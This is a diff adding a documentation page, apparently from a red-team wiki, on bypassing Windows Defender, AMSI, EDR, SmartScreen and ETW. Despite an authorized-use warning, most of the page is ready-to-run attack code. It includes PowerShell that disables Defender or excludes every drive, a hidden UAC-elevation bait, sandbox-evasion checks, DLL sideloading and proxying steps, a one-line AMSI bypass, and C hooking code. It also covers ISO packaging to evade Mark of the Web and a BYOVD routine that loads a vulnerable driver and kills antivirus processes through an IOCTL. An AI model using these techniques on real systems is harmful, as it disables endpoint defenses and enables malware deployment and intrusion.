@@ -1,0 +1,307 @@
+---
+title: "Antivirus and EDR Bypass"
+description: "Techniques for bypassing Windows Defender, AMSI, EDR solutions, and SmartScreen including DLL sideloading, obfuscation, BYOVD, and ETW patching"
+---
+
+## Overview
+
+Antivirus (AV) and Endpoint Detection and Response (EDR) solutions use static detection, dynamic analysis, and behavioral analysis to identify malicious activity. This page covers the core bypass techniques used in authorized red team engagements.
+
+<Warning>
+AV/EDR bypass techniques are for authorized red team operations only. Never test on systems without explicit written permission. Avoid uploading bypass tools to VirusTotal to preserve their operational usefulness.
+</Warning>
+
+## Stopping Windows Defender
+
+```powershell
+# Check status
+Get-MpComputerStatus
+Get-MpPreference | select Exclusion* | fl
+
+# Disable real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable entirely via registry
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" `
+  -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+
+# Add exclusion path
+Add-MpPreference -ExclusionPath (pwd)
+```
+
+### UAC Bait Before Disabling Defender
+
+Public loaders masquerading as game cheats ask for elevation first, then disable Defender:
+
+```powershell
+if (-not (net session 2>$null)) {
+    powershell -WindowStyle Hidden -Command `
+      "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""<path_to_loader>""'"
+    exit
+}
+```
+
+### Blanket MpPreference Exclusions (GachiLoader Pattern)
+
+After elevation, maximize Defender blind spots without stopping the service:
+
+```powershell
+$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
+Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
+$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
+Add-MpPreference -ExclusionExtension '.sys'
+```
+
+<Note>
+This approach keeps the Defender service running and reporting "healthy" while silently disabling scanning for all specified paths and extensions. All changes persist in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`.
+</Note>
+
+## AV Evasion Methodology
+
+<Tabs>
+  <Tab title="Static Detection Bypass">
+    Static detection flags known malicious strings, byte patterns, or file metadata.
+
+    **Bypass techniques:**
+    - **Encryption** — encrypt the payload; use a loader to decrypt in memory
+    - **Obfuscation** — change variable names, split strings, encode commands
+    - **Custom tooling** — write your own tools with no known signatures
+
+    Use [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) to find exactly which bytes trigger Defender:
+
+    ```bash
+    ThreatCheck.exe -f payload.exe
+    ```
+  </Tab>
+
+  <Tab title="Dynamic Analysis Bypass">
+    Dynamic analysis runs your binary in a sandbox watching for malicious behavior.
+
+    **Sandbox evasion techniques:**
+    - **Sleep before execution** — use long sleep delays (but beware sandbox sleep skipping)
+    - **Resource checks** — verify RAM > 4GB, CPU count > 2, GPU present
+    - **Domain/hostname checks** — detect sandbox hostname (Defender sandbox: `HAL9TH`)
+
+    ```powershell
+    if ($env:COMPUTERNAME -eq "HAL9TH") { exit }
+    if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
+    ```
+  </Tab>
+
+  <Tab title="Behavioral Detection Bypass">
+    Behavioral EDRs monitor process creation, memory allocation, and API call patterns.
+
+    - Use DLLs instead of EXEs (lower detection rate)
+    - Avoid known bad API sequences (VirtualAlloc → WriteProcessMemory → CreateRemoteThread)
+    - Use direct syscalls to bypass userland hooks
+    - Prefer `Fork & Run` (sacrifice process) over inline execution to protect the beacon
+  </Tab>
+</Tabs>
+
+## EXEs vs DLLs
+
+DLL files are significantly less detected than EXEs. When possible:
+- Prioritize DLL payloads
+- Use `rundll32.exe` or LOLBins to load your DLL
+- DLL detection rate is typically ~40-50% lower than equivalent EXE payloads
+
+## DLL Sideloading and Proxying
+
+### DLL Sideloading
+
+Find applications vulnerable to DLL hijacking:
+
+```powershell
+Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name | ForEach-Object {
+    $binarytoCheck = "C:\Program Files\" + $_
+    .\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
+}
+```
+
+### DLL Proxying with SharpDLLProxy
+
+Forward calls to the real DLL while executing your payload:
+
+```
+1. Find a vulnerable application (Siofra or Process Hacker)
+2. Generate shellcode (Havoc C2, Cobalt Strike, etc.)
+3. (Optional) Encode shellcode with Shikata Ga Nai
+4. .\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin
+5. Compile the generated C++ proxy DLL template in Visual Studio
+```
+
+### ForwardSideLoading (Forwarded Exports)
+
+Windows PE modules can export "forwarder" functions that point to a target DLL. If the target is not a KnownDLL, normal search order applies:
+
+```
+# Example: keyiso.dll exports KeyIsoSetAuditingInterface → NCRYPTPROV.SetAuditingInterface
+# NCRYPTPROV.dll is NOT a KnownDLL → loaded from same directory
+
+1. copy C:\Windows\System32\keyiso.dll C:\test\
+2. Drop malicious NCRYPTPROV.dll in C:\test\
+3. rundll32.exe C:\test\keyiso.dll,KeyIsoSetAuditingInterface
+   → Loader follows forward → loads NCRYPTPROV.dll from C:\test → DllMain executes
+```
+
+Check KnownDLLs:
+```bash
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
+
+# Find forwarded exports
+dumpbin /exports C:\Windows\System32\keyiso.dll | grep NCRYPTPROV
+```
+
+## AMSI Bypass
+
+AMSI (Anti-Malware Scan Interface) inspects scripts before execution in PowerShell, WSH, VBA, and .NET 4.8+.
+
+### Force amsiInitFailed
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+### Memory Patching (AmsiScanBuffer)
+
+Overwrite the `AmsiScanBuffer` function in `amsi.dll` to always return `E_INVALIDARG` (clean result).
+
+### Block amsi.dll from Loading (LdrLoadDll Hook)
+
+```c
+NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
+    if (module && module->Buffer){
+        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
+        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
+            return STATUS_DLL_NOT_FOUND;  // AMSI never loads
+        }
+    }
+    return realLdrLoadDll(path, flags, module, handle);
+}
+```
+
+### Use PowerShell v2
+
+PowerShell v2 predates AMSI — AMSI is never loaded:
+
+```bash
+powershell.exe -version 2
+```
+
+### AMSI Bypass Generator
+
+```bash
+# Generate obfuscated bypass scripts:
+# https://amsibypass.com/
+# https://github.com/Flangvik/AMSI.fail
+```
+
+## SmartScreen and Mark of the Web (MoTW) Bypass
+
+SmartScreen uses reputation-based detection. Files downloaded from the internet get a `Zone.Identifier` ADS (Mark of the Web).
+
+**Bypass by packaging in ISO/IMG:**
+
+MoTW cannot be applied to non-NTFS volumes. Files extracted from an ISO don't inherit the quarantine flag:
+
+```bash
+python PackMyPayload.py TotallyLegitApp.exe container.iso
+```
+
+Executables signed with a **trusted** code signing certificate won't trigger SmartScreen.
+
+## ETW Bypass
+
+Event Tracing for Windows (ETW) provides telemetry to security products. Patch `EtwEventWrite` to return immediately:
+
+```c
+// Patch EtwEventWrite in ntdll.dll to return immediately
+// Disables ETW logging for the current process
+```
+
+## C# Assembly Reflection
+
+Load .NET assemblies directly in memory without touching disk:
+
+<Tabs>
+  <Tab title="Fork & Run">
+    Spawn a sacrificial process, inject and execute the assembly, then kill it. Protects beacon if execution fails.
+  </Tab>
+  <Tab title="Inline Execution">
+    Execute the assembly inside your own process. Faster and stealthier but risks crashing the beacon on failure.
+  </Tab>
+</Tabs>
+
+Most C2 frameworks (Sliver, Covenant, Cobalt Strike, Havoc) support both modes natively.
+
+## Obfuscation Tools
+
+<CardGroup cols={2}>
+  <Card title="Freeze" icon="snowflake" href="https://github.com/optiv/Freeze">
+    Bypasses EDRs using suspended processes, direct syscalls, and alternative execution. Wraps shellcode in legitimate-looking containers.
+  </Card>
+  <Card title="Bashfuscator" icon="shuffle" href="https://github.com/Bashfuscator/Bashfuscator">
+    Bash script obfuscation for evading string-based detection.
+  </Card>
+  <Card title="Alcatraz" icon="lock" href="https://github.com/weak1337/Alcatraz">
+    x64 binary obfuscator for PE files including EXE, DLL, and SYS.
+  </Card>
+  <Card title="InvisibilityCloak" icon="eye-slash" href="https://github.com/h4wkst3r/InvisibilityCloak">
+    C# obfuscator designed for offensive security tools.
+  </Card>
+</CardGroup>
+
+## Deobfuscating ConfuserEx .NET Malware
+
+When analyzing ConfuserEx-protected malware:
+
+```bash
+# Step 1: Remove anti-tampering (AntiTamperKiller)
+python AntiTamperKiller.py Confused.exe Confused.clean.exe
+
+# Step 2: Symbol and control-flow recovery (de4dot-cex)
+de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
+
+# Step 3: Strip proxy calls (ProxyCall-Remover)
+ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
+
+# Step 4: Load in dnSpy/ILSpy for analysis
+```
+
+## BYOVD — Bring Your Own Vulnerable Driver
+
+Storm-2603 used this technique to kill AV/EDR from kernel space:
+
+```powershell
+# Install vulnerable but signed driver (AToolsKrnl64.sys renamed to ServiceMouse.sys)
+sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
+sc start ServiceMouse
+```
+
+Available IOCTLs in the vulnerable driver:
+
+| IOCTL | Capability |
+|-------|-----------|
+| `0x99000050` | Terminate arbitrary process by PID (kills Defender/EDR) |
+| `0x990000D0` | Delete arbitrary file on disk |
+| `0x990001D0` | Unload driver and remove service |
+
+```c
+HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+DWORD target_pid = /* AV process PID */;
+DeviceIoControl(hDrv, 0x99000050, &target_pid, sizeof(target_pid), NULL, 0, NULL, NULL);
+```
+
+<Note>
+Enable Microsoft's vulnerable driver block list (HVCI/WDAC/Smart App Control) to prevent loading known-vulnerable signed drivers.
+</Note>
+
+## References
+
+- [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)
+- [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)
+- [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
+- [Freeze](https://github.com/optiv/Freeze)
+- [AMSI.fail](https://github.com/Flangvik/AMSI.fail)
+- [S3cur3Th1sSh1t AMSI Bypass Collection](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+- [Siofra DLL Sideloading Scanner](https://github.com/Cybereason/siofra)
